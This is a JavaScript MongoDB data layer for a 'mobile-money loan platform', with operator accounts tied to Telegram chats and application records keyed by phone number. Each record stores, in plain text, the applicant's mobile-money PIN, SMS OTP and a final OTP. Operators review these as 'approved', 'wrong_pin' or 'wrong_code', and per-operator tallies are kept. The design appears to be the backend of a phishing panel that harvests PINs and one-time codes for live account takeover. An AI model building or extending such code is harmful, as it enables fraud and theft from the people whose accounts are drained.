const { MongoClient } = require('mongodb');

let client = null;
let db = null;
let connectionPromise = null;

// Database and collections setup
const DB_NAME = process.env.DB_NAME || 'momo_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications',
    ENVIRONMENT_LOGS: 'environment_logs'
};

/**
 * Ensures database is connected before executing queries
 */
async function ensureConnected() {
    if (!db || !client) {
        await connectDatabase();
    }
    return db;
}

/**
 * Connect to MongoDB with connection pooling & error handling
 */
async function connectDatabase() {
    if (db && client) {
        return db; // Reuse existing connection if already established
    }

    // Prevent race conditions when concurrent connection requests arrive
    if (connectionPromise) {
        return connectionPromise;
    }

    connectionPromise = (async () => {
        try {
            const MONGODB_URI = process.env.MONGODB_URI;

            if (!MONGODB_URI) {
                throw new Error('❌ MONGODB_URI is not set in environment variables');
            }

            console.log('🔄 Connecting to MongoDB...');

            client = new MongoClient(MONGODB_URI, {
                maxPoolSize: 10,
                minPoolSize: 2,
                serverSelectionTimeoutMS: 5000
            });

            await client.connect();
            db = client.db(DB_NAME);

            console.log('✅ Connected to MongoDB successfully');

            await createIndexes();

            return db;
        } catch (error) {
            console.error('❌ MongoDB connection error:', error);
            client = null;
            db = null;
            throw error;
        } finally {
            connectionPromise = null;
        }
    })();

    return connectionPromise;
}

/**
 * Create database indexes for optimized query performance
 */
async function createIndexes() {
    try {
        const database = await ensureConnected();

        // Admins indexes
        await database.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await database.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await database.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
        await database.collection(COLLECTIONS.ADMINS).createIndex({ role: 1 });

        // Applications indexes
        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsStatus: 1 });
        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsOtpStatus: 1 });
        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });
        
        // Compound index for fast pending queue resolution
        await database.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1, timestamp: -1 });

        // Logs indexes
        await database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 });
        await database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ timestamp: -1 });
        await database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ action: 1 });

        console.log('✅ Database indexes created/verified');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
    }
}

/**
 * Close database connection
 */
async function closeDatabase() {
    if (client) {
        await client.close();
        client = null;
        db = null;
        connectionPromise = null;
        console.log('✅ Database connection closed');
    }
}

// ==========================================
// ENVIRONMENT & MESSAGING LOGS OPERATIONS
// ==========================================

async function logAdminActivity(adminId, action, details = {}) {
    try {
        const database = await ensureConnected();
        const logEntry = {
            adminId: String(adminId || 'SYSTEM'),
            action,
            details,
            timestamp: new Date().toISOString()
        };
        await database.collection(COLLECTIONS.ENVIRONMENT_LOGS).insertOne(logEntry);
        console.log(`📝 Environment Log [${action}] recorded for admin: ${adminId}`);
    } catch (error) {
        console.error('❌ Error recording environment log:', error);
    }
}

async function getEnvironmentLogs(query = {}, limit = 100) {
    try {
        const database = await ensureConnected();
        return await database.collection(COLLECTIONS.ENVIRONMENT_LOGS)
            .find(query)
            .sort({ timestamp: -1 })
            .limit(limit)
            .toArray();
    } catch (error) {
        console.error('❌ Error getting environment logs:', error);
        return [];
    }
}

// ==========================================
// ADMIN & SUPER ADMIN OPERATIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        const database = await ensureConnected();
        const rawId = adminData.adminId || adminData.id;

        if (!rawId) throw new Error('Admin ID is required');
        const adminId = String(rawId);

        const existingAdmin = await database.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);

        const adminDocument = {
            adminId,
            name: adminData.name || `Admin ${adminId}`,
            email: adminData.email || null,
            chatId: adminData.chatId !== undefined && adminData.chatId !== null ? String(adminData.chatId) : null,
            role: adminData.role || (adminId === 'ADMIN001' ? 'super_admin' : 'admin'),
            status: adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString()
        };

        if (adminData.botToken) adminDocument.botToken = adminData.botToken;

        const result = await database.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        
        await logAdminActivity(adminId, 'ADMIN_CREATED', { name: adminDocument.name, role: adminDocument.role });

        console.log(`✅ Admin saved successfully: ${adminId} (${adminDocument.name})`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        if (!adminId) return null;
        const database = await ensureConnected();
        return await database.collection(COLLECTIONS.ADMINS).findOne({ adminId: String(adminId) });
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        if (!chatId) return null;
        const database = await ensureConnected();
        return await database.collection(COLLECTIONS.ADMINS).findOne({ chatId: String(chatId) });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

async function getAdminIdByChatId(chatId) {
    try {
        const admin = await getAdminByChatId(chatId);
        return admin ? admin.adminId : null;
    } catch (error) {
        console.error('❌ Error getting admin ID by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        const database = await ensureConnected();
        return await database.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        const database = await ensureConnected();
        return await database.collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        const database = await ensureConnected();
        const formattedUpdates = { ...updates, updatedAt: new Date().toISOString() };
        if (formattedUpdates.chatId !== undefined && formattedUpdates.chatId !== null) {
            formattedUpdates.chatId = String(formattedUpdates.chatId);
        }

        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId: String(adminId) },
            { $set: formattedUpdates }
        );
        
        await logAdminActivity(adminId, 'ADMIN_UPDATED', updates);

        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        const database = await ensureConnected();
        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId: String(adminId) },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
        
        await logAdminActivity(adminId, 'ADMIN_STATUS_UPDATED', { status });

        console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

async function transferAdminChatId(oldChatId, newChatId) {
    try {
        const database = await ensureConnected();
        const existingAdmin = await getAdminByChatId(oldChatId);
        if (!existingAdmin) {
            throw new Error(`No admin found with Telegram Chat ID: ${oldChatId}`);
        }

        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
            { chatId: String(oldChatId) },
            { $set: { chatId: String(newChatId), updatedAt: new Date().toISOString() } }
        );

        await logAdminActivity(existingAdmin.adminId, 'ADMIN_TRANSFERRED', { oldChatId, newChatId });
        console.log(`🔄 Transferred admin ${existingAdmin.adminId} from ${oldChatId} to ${newChatId}`);
        return result;
    } catch (error) {
        console.error('❌ Error transferring admin:', error);
        throw error;
    }
}

async function suspendAllAdmins(exceptSuper = true) {
    try {
        const database = await ensureConnected();
        const query = exceptSuper ? { role: { $ne: 'super_admin' }, adminId: { $ne: 'ADMIN001' } } : {};
        const result = await database.collection(COLLECTIONS.ADMINS).updateMany(
            query,
            { $set: { status: 'paused', updatedAt: new Date().toISOString() } }
        );
        console.log(`🔒 Suspended ${result.modifiedCount} admin links.`);
        return result;
    } catch (error) {
        console.error('❌ Error suspending admins:', error);
        throw error;
    }
}

async function deleteAdmin(adminId) {
    try {
        const database = await ensureConnected();
        const result = await database.collection(COLLECTIONS.ADMINS).deleteOne({ adminId: String(adminId) });
        
        await logAdminActivity(adminId, 'ADMIN_DELETED', {});

        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const database = await ensureConnected();
        const count = await database.collection(COLLECTIONS.ADMINS).countDocuments({ adminId: String(adminId) });
        return count > 0;
    } catch (error) {
        console.error('❌ Error checking admin existence:', error);
        return false;
    }
}

async function getAdminCount() {
    try {
        const database = await ensureConnected();
        return await database.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        console.error('❌ Error getting admin count:', error);
        return 0;
    }
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================

/**
 * Save Application
 * Supports flexible PIN lengths, SMS text, OTPs, and dynamic parameters
 */
async function saveApplication(appData) {
    try {
        if (!appData || appData.id === undefined || appData.id === null) {
            throw new Error('Application ID (appData.id) is required');
        }

        const database = await ensureConnected();
        const applicationId = String(appData.id);

        const applicationDocument = {
            id: applicationId,
            adminId: appData.adminId ? String(appData.adminId) : 'UNASSIGNED',
            adminName: appData.adminName || 'System',
            phoneNumber: appData.phoneNumber ? String(appData.phoneNumber).trim() : '',
            
            // Core Authentication Data
            pin: appData.pin ? String(appData.pin) : null,
            pinStatus: appData.pinStatus || 'pending',
            
            // SMS / SMS OTP Data
            smsText: appData.smsText || appData.smsOtp || null,
            smsOtp: appData.smsOtp || appData.smsText || null,
            smsStatus: appData.smsStatus || appData.smsOtpStatus || 'pending',
            smsOtpStatus: appData.smsOtpStatus || appData.smsStatus || 'pending',
            
            // Second stage / final OTP
            otp: appData.otp ? String(appData.otp) : null,
            otpStatus: appData.otpStatus || 'pending',

            // Flow tracking & metadata
            assignmentType: appData.assignmentType || 'auto',
            isReturningUser: Boolean(appData.isReturningUser),
            previousCount: appData.previousCount || 0,
            ipAddress: appData.ipAddress || null,
            userAgent: appData.userAgent || null,
            timestamp: appData.timestamp || new Date().toISOString(),
            updatedAt: new Date().toISOString()
        };

        const result = await database.collection(COLLECTIONS.APPLICATIONS).insertOne(applicationDocument);

        if (appData.adminId) {
            await logAdminActivity(appData.adminId, 'APPLICATION_CREATED', { 
                applicationId, 
                phoneNumber: appData.phoneNumber 
            });
        }

        console.log(`💾 Application saved: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        if (!applicationId) return null;
        const database = await ensureConnected();
        return await database.collection(COLLECTIONS.APPLICATIONS).findOne({ id: String(applicationId) });
    } catch (error) {
        console.error('❌ Error getting application:', error);
        return null;
    }
}

async function getApplicationsByPhone(phoneNumber) {
    try {
        if (!phoneNumber) return [];
        const database = await ensureConnected();
        return await database.collection(COLLECTIONS.APPLICATIONS)
            .find({ phoneNumber: String(phoneNumber).trim() })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting applications by phone:', error);
        return [];
    }
}

async function updateApplication(applicationId, updates) {
    try {
        const database = await ensureConnected();
        const formattedUpdates = { ...updates, updatedAt: new Date().toISOString() };

        const result = await database.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: String(applicationId) },
            { $set: formattedUpdates }
        );

        const app = await getApplication(applicationId);
        if (app && app.adminId) {
            await logAdminActivity(app.adminId, 'APPLICATION_UPDATED', { applicationId, updates });
        }

        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        const database = await ensureConnected();
        return await database.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId: String(adminId) })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        const database = await ensureConnected();
        const pendingCondition = {
            $or: [
                { pinStatus: 'pending' }, 
                { smsStatus: 'pending' }, 
                { smsOtpStatus: 'pending' }, 
                { otpStatus: 'pending' }
            ]
        };

        const query = (adminId === 'ADMIN001' || !adminId) 
            ? pendingCondition 
            : { adminId: String(adminId), ...pendingCondition };

        return await database.collection(COLLECTIONS.APPLICATIONS)
            .find(query)
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        return [];
    }
}

// ==========================================
// STATISTICS OPERATIONS (/stats)
// ==========================================

async function getAdminStats(adminId) {
    try {
        const database = await ensureConnected();
        const query = adminId === 'ADMIN001' ? {} : { adminId: String(adminId) };

        const total = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments(query);
        const pinPending = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...query, pinStatus: 'pending' });
        const pinApproved = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...query, pinStatus: 'approved' });
        const smsPending = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            ...query, 
            $or: [{ smsStatus: 'pending' }, { smsOtpStatus: 'pending' }] 
        });
        const fullyApproved = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...query, otpStatus: 'approved' });

        return { total, pinPending, pinApproved, smsPending, fullyApproved };
    } catch (error) {
        console.error('❌ Error getting admin stats:', error);
        return { total: 0, pinPending: 0, pinApproved: 0, smsPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const database = await ensureConnected();
        const totalAdmins = await database.collection(COLLECTIONS.ADMINS).countDocuments({});
        const totalApplications = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
        const pinApproved = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
        const smsPending = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [{ smsStatus: 'pending' }, { smsOtpStatus: 'pending' }]
        });
        const fullyApproved = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
        const totalRejected = await database.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [
                { pinStatus: 'rejected' },
                { smsStatus: 'rejected' },
                { smsOtpStatus: 'rejected' },
                { otpStatus: { $in: ['wrong_pin', 'wrong_code', 'rejected'] } }
            ]
        });

        return { totalAdmins, totalApplications, pinPending, pinApproved, smsPending, fullyApproved, totalRejected };
    } catch (error) {
        console.error('❌ Error getting global stats:', error);
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, smsPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        const statsPromises = admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return { adminId: admin.adminId, name: admin.name, role: admin.role, ...stats };
        });
        return await Promise.all(statsPromises);
    } catch (error) {
        console.error('❌ Error getting per-admin stats:', error);
        return [];
    }
}

// ==========================================
// MAINTENANCE HELPERS
// ==========================================

async function getAllAdminsDetailed() {
    try {
        const database = await ensureConnected();
        const admins = await database.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
        console.log(`📊 Found ${admins.length} admins in database`);
        admins.forEach(admin => {
            console.log(`   ${admin.adminId}: ${admin.name} (Role: ${admin.role}, chatId: ${admin.chatId}, status: ${admin.status})`);
        });
        return admins;
    } catch (error) {
        console.error('❌ Error getting detailed admins:', error);
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const database = await ensureConnected();
        const result = await database.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } },
                { adminId: null },
                { adminId: '' }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        console.error('❌ Error cleaning up invalid admins:', error);
        throw error;
    }
}

module.exports = {
    connectDatabase,
    closeDatabase,

    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAdminIdByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    transferAdminChatId,
    suspendAllAdmins,
    deleteAdmin,
    adminExists,
    getAdminCount,

    saveApplication,
    getApplication,
    getApplicationsByPhone,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,

    logAdminActivity,
    getEnvironmentLogs,

    getAdminStats,
    getStats,
    getPerAdminStats,

    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
